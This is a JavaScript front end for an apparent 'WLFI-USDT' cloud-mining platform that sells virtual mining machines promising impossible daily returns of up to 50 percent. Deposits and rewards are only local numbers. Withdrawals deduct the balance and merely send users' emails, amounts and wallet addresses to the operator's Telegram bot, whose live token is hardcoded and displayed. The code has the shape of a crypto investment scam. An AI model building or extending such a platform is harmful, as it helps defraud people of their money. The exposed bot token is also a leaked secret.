const TG_TOKEN = "8401039769:AAErdk3eB81U9PTBUtHpNeM4FdWVpo-0Os0"; // PROVIDED BY USER (insecure in client)
const TG_CHAT = "7417215529"; // chart id provided (here used as chat id)
const CHART_ID = "7417215529";

const DEFAULT_BALANCE = 20.0; // every user gets 20 USDT as starting balance
const MIN_WITHDRAW = 50.0; // as per your withdraw screen text
const MIN_DEPOSIT = 10.0;

let state = {
  balance: 0,
  brokerBalance: 0,
  foundBalance: 0,
  miningActive: false,
  miningEnd: null,
  machines: []
};

// Initialize mock machines from your table
const machineSpecs = [
  { id:1, price:10, daily:2 },
  { id:2, price:50, daily:10 },
  { id:3, price:150, daily:30 },
  { id:4, price:450, daily:90 },
  { id:5, price:1350, daily:275 },
  { id:6, price:4050, daily:844 },
  { id:7, price:12150, daily:2650 },
  { id:8, price:36450, daily:8477 },
  { id:9, price:72900, daily:29160 },
  { id:10, price:145800, daily:72900 }
];

// DOM refs
const balanceDisplay = document.getElementById("balance-display");
const withdrawBalance = document.getElementById("withdraw-balance");
const depositConfirmBtn = document.getElementById("deposit-confirm");
const depositMethod = document.getElementById("deposit-method");
const depositAmount = document.getElementById("deposit-amount");
const withdrawConfirm = document.getElementById("withdraw-confirm");
const withdrawAmount = document.getElementById("withdraw-amount");
const withdrawMethod = document.getElementById("withdraw-method");
const withdrawAddress = document.getElementById("withdraw-address");
const machinesList = document.getElementById("machines-list");
const loadingOverlay = document.getElementById("loading-overlay");
const chartIdSpan = document.getElementById("chart-id");
const tgTokenSpan = document.getElementById("tg-token");

chartIdSpan.innerText = CHART_ID;
tgTokenSpan.innerText = TG_TOKEN;

// Utilities
function showLoading(sec=2){
  loadingOverlay.classList.remove("hidden");
  return new Promise(r => setTimeout(()=>{loadingOverlay.classList.add("hidden"); r();}, sec*1000));
}
function setState(newState){
  state = {...state, ...newState};
  render();
}
function moneyFmt(x){ return Number(x).toFixed(6); }

// Initial setup (persist in localStorage)
function loadState(){
  const saved = localStorage.getItem("solcoin_state");
  if(saved){
    state = JSON.parse(saved);
  } else {
    state.balance = DEFAULT_BALANCE; // user asked every user gets 20 USDT -> using 20
    state.brokerBalance = 0;
    state.foundBalance = 0;
    state.miningActive = false;
    state.miningEnd = null;
    state.machines = [];
    // set default to 20 USDT
    state.balance = 20.0;
    saveState();
  }
}
function saveState(){ localStorage.setItem("solcoin_state", JSON.stringify(state)); }

// Render UI
function render(){
  balanceDisplay.innerText = moneyFmt(state.balance);
  withdrawBalance.innerText = `${moneyFmt(state.balance)} USDT`;
  // machines
  machinesList.innerHTML = "";
  machineSpecs.forEach(ms => {
    const mineOwn = state.machines.filter(m=>m.id===ms.id).length;
    const div = document.createElement("div");
    div.className = "machine";
    div.innerHTML = `
      <div><strong>Machine ${ms.id}</strong></div>
      <div class="price">${ms.price} USDT</div>
      <div>Daily Mining: ${ms.daily} USDT</div>
      <div>Owned: ${mineOwn}</div>
      <button data-id="${ms.id}" class="buy-machine">Buy</button>
    `;
    machinesList.appendChild(div);
  });
  saveState();
}


// Copy buttons
document.querySelectorAll(".copy-btn").forEach(b=>{
  b.addEventListener("click", e=>{
    const target = b.dataset.target;
    const el = document.getElementById(target);
    navigator.clipboard.writeText(el.innerText).then(()=>{
      b.innerText = "Copied";
      setTimeout(()=>b.innerText="Copy",1200);
    });
  });
});
document.getElementById("copy-ref").addEventListener("click", ()=>{
  const ref = document.getElementById("ref-code").value;
  navigator.clipboard.writeText(ref);
  alert("Referral code copied");
});

// Deposit logic
depositConfirmBtn.addEventListener("click", async ()=>{
  const amount = parseFloat(depositAmount.value);
  const method = depositMethod.value;
  if(isNaN(amount) || amount < MIN_DEPOSIT){ alert(`Minimum deposit for the WLFI-USDT mining platform: ${MIN_DEPOSIT} USDT`); return; }
  // show loading screen 2 sec
  await showLoading(2);
  // Simulate deposit credited after 3 minutes - for demo, we add instantly but show note that in real app it may take 3 min
  state.balance += amount;
  saveState();
  render();
  alert(`Deposit confirmed for ${amount} USDT via ${method}. (Demo: credited instantly. Real platform: might take few minutes.)`);
});

// Withdraw logic
withdrawConfirm.addEventListener("click", async ()=>{
  const amount = parseFloat(withdrawAmount.value);
  const method = withdrawMethod.value;
  const addr = withdrawAddress.value.trim();
  if(isNaN(amount) || amount < MIN_WITHDRAW){ alert(`Minimum withdrawal amount：${MIN_WITHDRAW} USDT`); return; }
  if(!addr){ alert("Please enter withdrawal address."); return; }
  if(amount > state.balance){ alert("Insufficient balance."); return; }

  // remove amount
  state.balance -= amount;
  saveState();
  render();

  // Send Telegram notification about withdrawal request
  await sendTelegramMessage(`🚀 Withdraw Request\nUser: ${document.getElementById('user-email').innerText}\nAmount: ${amount} USDT\nChain: ${method}\nAddress: ${addr}\nNote: Withdraw processed once daily. (Demo)`);
  alert("Withdrawal request sent. Please wait up to 24 hours.");
});

// Buy machine
machinesList.addEventListener("click", async (e)=>{
  if(e.target.classList.contains("buy-machine")){
    const id = parseInt(e.target.dataset.id);
    const ms = machineSpecs.find(m=>m.id===id);
    if(!ms) return;
    if(state.balance < ms.price){ 
      if(!confirm("Balance insufficient. Go to recharge?")) return;
      // open deposit panel UI hint (in this demo, we just focus deposit amount)
      document.getElementById("deposit-amount").focus();
      return;
    }
    if(!confirm(`Buy Machine ${id} for ${ms.price} USDT?`)) return;
    // process buy
    state.balance -= ms.price;
    state.machines.push({id:ms.id, boughtAt:Date.now()});
    // start cloud mining automatically for this machine: add bonus mining yield (30% extra as per request if machine bought -> we'll track)
    // For demo, add daily mining to foundBalance immediately scaled down
    const bonus = ms.daily * 0.30; // 30% extra mining
    state.foundBalance += bonus;
    saveState();
    render();

    // send telegram message about purchase
    await sendTelegramMessage(`🛒 Purchase\nUser: ${document.getElementById('user-email').innerText}\nBought Machine ${id}\nPrice: ${ms.price} USDT\nDaily: ${ms.daily} USDT\n30% bonus: ${bonus} USDT`);

    alert(`Machine ${id} purchased. 30% bonus (${bonus} USDT) added to Found Balance (demo). Telegram notified.`);
  }
});

// Mining / Mine button
document.getElementById("mine-btn").addEventListener("click", async ()=>{
  if(state.miningActive){
    alert("Mining already active. You can claim after 12 hours.");
    return;
  }
  // start mining for 12 hours
  state.miningActive = true;
  state.miningEnd = Date.now() + 12*60*60*1000; // 12 hours
  saveState();
  render();
  await sendTelegramMessage(`⛏️ Mining started\nUser: ${document.getElementById('user-email').innerText}\nMining time: 12 hours`);
  alert("Mining started for 12 hours (demo). After 12 hours you can claim.");
});

// For demo: claim button appears after mining completes (we'll poll)
setInterval(()=>{
  if(state.miningActive && state.miningEnd && Date.now() > state.miningEnd){
    state.miningActive = false;
    // compute reward: sum daily rates of machines scaled to 12 hours (0.5 of a day)
    const totalDaily = state.machines.reduce((s,m)=>{
      const spec = machineSpecs.find(x=>x.id===m.id);
      return s + (spec?spec.daily:0);
    },0);
    const reward = (totalDaily * 0.5); // 12 hours = 0.5 day
    state.balance += reward;
    saveState();
    render();
    sendTelegramMessage(`✅ Mining Claimed\nUser: ${document.getElementById('user-email').innerText}\nReward: ${reward} USDT\nAdded to balance.`);
    alert(`Mining finished. Reward ${reward.toFixed(6)} USDT added to your balance (demo).`);
  }
}, 5000);

// Telegram helper (client side). Insecure: token public. For production move to server.
async function sendTelegramMessage(text){
  try{
    // use fetch to telegram bot sendMessage (note: CORS may block in browsers).
    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
    // To avoid CORS issues in real use, call from server. Here we try best-effort.
    const payload = {
      chat_id: TG_CHAT,
      text: text
    };
    // try fetch; if CORS blocked, fall back to open window (user can manually send)
    try{
      await fetch(url, {
        method:"POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify(payload)
      });
    } catch (err){
      // fallback: open in new tab (will reveal token) — avoid by server
      console.warn("Telegram fetch blocked (CORS). Message not delivered from browser.");
    }
  } catch(e){
    console.error("Telegram send failed", e);
  }
}

// On load
loadState();
render();

// small UI niceties: animate coins periodically to feel "advanced"
(function animateCoins(){
  const coins = document.getElementById("coins-anim");
  if(!coins) return;
  // create shimmering particles
  for(let i=0;i<6;i++){
    const p = document.createElement("div");
    p.style.position="absolute";
    p.style.width="12px";p.style.height="12px";p.style.borderRadius="50%";
    p.style.left = `${10 + i*10}%`;
    p.style.bottom = `${40 + (i%3)*6}px`;
    p.style.background = `radial-gradient(circle at 30% 30%, #ffffff66, #2ee0d8)`;
    p.style.filter = "blur(0.6px)";
    p.style.opacity = "0.9";
    p.style.transition = "transform 1.6s ease-in-out";
    coins.appendChild(p);
    (function(el, delay){
      setInterval(()=>{ el.style.transform = `translateY(${Math.random()*-18}px) scale(${1+Math.random()*0.08})`; setTimeout(()=>el.style.transform="translateY(0) scale(1)",800); }, 1200 + delay);
    })(p, i*120);
  }
})();

// small timer display for "mining timer"
setInterval(()=>{
  if(state.miningActive && state.miningEnd){
    const diff = Math.max(0, Math.floor((state.miningEnd - Date.now())/1000));
    const h = String(Math.floor(diff/3600)).padStart(2,'0');
    const m = String(Math.floor((diff%3600)/60)).padStart(2,'0');
    const s = String(diff%60).padStart(2,'0');
    document.getElementById("mining-timer").innerText = `${h}:${m}:${s}`;
  } else {
    document.getElementById("mining-timer").innerText = "Not mining";
  }
}, 1000);

// small UX: show deposit addresses when deposit method changes (no-op here)
depositMethod.addEventListener("change", ()=>{
  // highlight selected address row (simple)
  const v = depositMethod.value;
  // nothing fancy for this demo
});
